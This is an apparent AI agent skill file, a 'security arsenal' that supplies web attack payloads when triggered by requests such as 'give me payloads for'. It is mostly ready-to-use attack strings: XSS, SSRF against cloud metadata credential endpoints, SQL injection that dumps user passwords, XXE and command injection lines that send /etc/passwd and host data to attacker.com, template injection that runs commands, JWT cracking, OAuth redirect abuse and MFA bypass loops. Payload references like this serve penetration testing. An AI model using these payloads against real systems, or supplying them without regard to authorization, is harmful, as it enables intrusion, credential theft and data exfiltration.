---
name: security-arsenal
description: |
  Complete security testing payload library — XSS, SSRF, SQLi, XXE, NoSQLi,
  command injection, SSTI, IDOR, path traversal, JWT attacks, HTTP smuggling,
  WebSocket attacks, MFA bypass, and cloud metadata endpoints.
triggers:
  - what payloads should I try
  - give me payloads for
  - xss payloads
  - ssrf payloads
  - sqli payloads
  - cheatsheet
  - security payloads
  - testing payloads
category: security
---
# Security Arsenal — Payload Library

Adapted from Claude-BugHunter by ElementalSouls. Complete payload library organized by vulnerability class.

---

## XSS Payloads

### Basic Probes
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
```

### Attribute Context Escapes
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
" onfocus="alert(1)" autofocus="
`onmouseover=alert(1)
```

### Sanitizer Bypasses (mXSS)
```html
<math><style><!--</style><img src=x onerror=alert(1)>-->
<svg><style><!--</style><img src=x onerror=alert(1)>-->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->
```

### Markdown/RDoc JavaScript Link
```markdown
[Click me](javascript:alert(document.domain))
[Click me](javascript:alert(1))
```

### CSP Bypass — Angular Template Injection
```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

### DOM XSS Sources & Sinks
**Sources**: `location.hash`, `location.search`, `location.href`, `document.referrer`, `window.name`, `document.URL`
**Sinks**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `setInterval()`, `new Function()`, `element.src`, `location.href`

### Blind XSS Payloads (OOB)
```html
<script src=https://YOUR.burpcollaborator.net/xss></script>
<img src=https://YOUR.burpcollaborator.net/xss>
<link rel=stylesheet href=https://YOUR.burpcollaborator.net/xss>
```

### SVG-Based XSS
```html
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<svg xmlns="http://www.w3.org/2000/svg"><use href="data:image/svg+xml,<script>alert(1)</script>"/></svg>
```

### Polyglot (works in HTML/JS/CSS context)
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1)//
```

---

## SSRF Payloads

### Cloud Metadata Endpoints
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

### IP Bypass Payloads (all map to 127.0.0.1)
```
Decimal:     http://2130706433
Octal:       http://0177.0.0.1
Hex:         http://0x7f.0x0.0x0.0x1
Short form:  http://127.1
IPv6:        http://[::1]
IPv6 compat: http://[::ffff:127.0.0.1]
DNS:         http://localhost
CIDR:        http://0/
```

### Internal Service Fingerprinting
```
http://localhost:6379/        # Redis
http://localhost:9200/        # Elasticsearch
http://localhost:27017/       # MongoDB
http://localhost:8080/        # Admin panels
http://localhost:2375/        # Docker API
http://localhost:6443/        # Kubernetes API
http://localhost:2379/        # etcd
http://localhost:9090/        # Prometheus
http://localhost:3000/        # Grafana
http://localhost:5432/        # PostgreSQL
```

### SSRF Detection Payloads
```
url=https://YOUR.interactsh.com/test
url=http://YOUR.burpcollaborator.net
src=http://169.254.169.254/latest/meta-data/
uri=file:///etc/passwd
```

### Redirect-Based SSRF
If endpoint validates initial URL but follows 30x, host a redirect server:
- Your domain → 302 → `http://169.254.169.254/latest/meta-data/`
- Your domain → 302 → `file:///etc/passwd`

---

## SQL Injection Payloads

### Detection
```sql
' OR '1'='1
" OR "1"="1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR '1'='1'--
1' ORDER BY 1--
1' ORDER BY 2--
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
```

### Time-Based Blind
```sql
# MySQL
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5('test'))--

# PostgreSQL
' AND pg_sleep(5)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--

# Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### String-Based
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT @@version,user()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### WAF Bypass
```sql
MySQL inline comments:  /*!50000 SELECT*/
Comment injection:      SE/**/LECT
Case variation:         SeLeCt
URL encoding:           %27
Double URL encoding:    %2527
Unicode apostrophe:     ʼ
Newline injection:      %0a
Tab injection:          %09
```

### NoSQL Injection (MongoDB)

**JSON body:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.password == ''"}
```

**URL parameter:**
```
/login?username[$ne]=null&password[$ne]=null
/login?username[$regex]=.*&password[$regex]=.*
```

**Key operators:**
- `$ne` = not equal (bypass: any value matches)
- `$gt` = greater than (bypass: compare to empty string)
- `$regex` = regex match (bypass: `.*` matches anything)
- `$where` = JavaScript execution (potential RCE)

---

## XXE Payloads

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Blind OOB via HTTP
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>
```

### Blind OOB with Data Exfiltration
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
 <!ENTITY % data SYSTEM "file:///etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
 %param1;
]>
<foo>&exfil;</foo>
```

### XXE via SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
 <text x="10" y="50" font-size="30">&xxe;</text>
</svg>
```

---

## SSTI Payloads

### Detection Polyglot
```
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}{{7*'7'}}
```

### Jinja2 (Python)
```jinja2
{{7*7}}
{{config}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Twig (PHP)
```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)
```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)
```
#set($x=$foo.class.forName('java.lang.Runtime'))
#set($y=$x.getRuntime())
$y.exec('id')
```

### ERB (Ruby)
```
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>
```

### Spring EL
```
${7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### Go text/template (Nomad)
```
{{ env "NOMAD_SECRET_ID" }}
{{ runscript "id" }}
```

---

## Path Traversal Payloads

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd  # double URL encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd  # Unicode overlong
/etc/passwd%00.jpg  # null byte truncation
../../../etc/passwd%00
file:///etc/passwd
```

---

## JWT Attacks

### None Algorithm Attack
Change `alg` in header to `"none"`, remove signature:
```json
{"alg":"none","typ":"JWT"}
// payload as-is, no signature
```

### Algorithm Confusion
If server uses RS256 but has the public key:
```bash
# Create HS256 JWT signed with the RSA public key
jwt_tool <JWT> -X a -pb cat public.pem
# Or use python:
# jwt.encode(payload, public_key, algorithm='HS256')
```

### Weak Secret Bruteforce
```bash
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
# Or: jwt_tool <JWT> -C -d ~/wordlists/rockyou.txt
```

---

## OAuth Attack Payloads

### Missing PKCE Check
```bash
# Standard PKCE flow includes code_challenge
# Test without it — if it works, CSRF on OAuth is possible
/authorize?response_type=code&client_id=X&redirect_uri=https://attacker.com
```

### State Parameter Abuse
```
/authorize?response_type=code&client_id=X&redirect_uri=https://app.com/callback&state=
```

### Open Redirect Chain
```
/authorize?response_type=code&client_id=X&redirect_uri=https://attacker.com/
/authorize?response_type=code&client_id=X&redirect_uri=https://app.com.attacker.com/
/authorize?response_type=code&client_id=X&redirect_uri=https://app.com%2f@attacker.com/
```

---

## Command Injection Payloads

### Basic
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
; ls /
```

### Blind Detection
```bash
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1 &
```

### OOB Exfiltration
```bash
; curl http://attacker.com/$(whoami)
| nslookup $(hostname).attacker.com
; wget --post-data=$(cat /etc/passwd) http://attacker.com/
```

---

## HTTP Request Smuggling

### CL.TE (Content-Length → Transfer-Encoding)
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0

```

### Detection — Time-Based
Send a request with smuggled prefix that delays the next request. If subsequent request takes 10+ seconds, smuggling is confirmed.

---

## Authentication Bypass Payloads

### Parameter Manipulation
```json
{"role": "admin", "isAdmin": true, "admin": true}
{"group": "administrators", "type": "admin"}
{"user_id": 1, "account_type": "premium"}
```

### HTTP Method Tampering
```
GET /admin → 403 → try PUT, POST, DELETE, PATCH, OPTIONS
GET /api/admin/users → 403 → try HEAD /api/admin/users
```

### Old API Version
```
/v2/users/123 → try /v1/users/123, /v3/users/123
```

### Mass Assignment / Parameter Pollution
```
/api/user/update?id=123&role=admin
/api/user/update.json?id=123&role=admin
POST /api/user with {"id": 123, "is_admin": true}
```

---

## MFA/2FA Bypass

### OTP Brute Force
```
If rate limiting is missing → brute all 6-digit codes (1M combinations)
If rate limiting per IP → rotate IPs via proxy
If rate limiting per session → reuse session token + replay code
```

### Race Condition on OTP
```bash
# Send 50+ OTP verification requests simultaneously
for i in {1..50}; do
  curl -X POST https://target.com/verify-otp \
    -d "code=123456&session=TOKEN" &
done
wait
```

### Recovery Code Bypass
```
Check if recovery codes bypass MFA entirely
Try /login with password only (no MFA prompt on some flows)
Check /forgot-password flow — does it bypass MFA?
```

### Factor Downgrade
```
Initiate login with MFA → intercept → remove MFA requirement from request
```